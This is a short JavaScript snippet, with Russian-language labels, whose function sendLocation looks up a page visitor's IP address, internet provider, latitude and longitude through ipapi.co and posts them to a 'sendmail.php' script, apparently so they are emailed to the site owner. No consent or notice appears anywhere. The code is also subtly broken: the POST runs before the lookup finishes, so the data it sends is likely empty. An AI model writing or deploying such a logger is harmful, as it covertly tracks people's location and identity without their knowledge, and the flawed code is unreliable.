var info
async function sendLocation(e){
    fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
        
        const userIP = data.ip;
        const network = data.org;
        const latitude = data.latitude;
        const longitude = data.longitude
        console.log(`IP пользователя: ${userIP}`);
        console.log(`Интернет провайдер: ${network}`);
        console.log(`широта: ${latitude}`);
        console.log(`долгота: ${longitude}`);
        info = `IP пользователя: ${userIP}\n Интернет провайдер: ${network}\n широта: ${latitude}\n долгота: ${longitude}`
        
    });

    let response = await fetch('sendmail.php', {
        method: 'POST',
        body: info,
    })
}


   
    
    
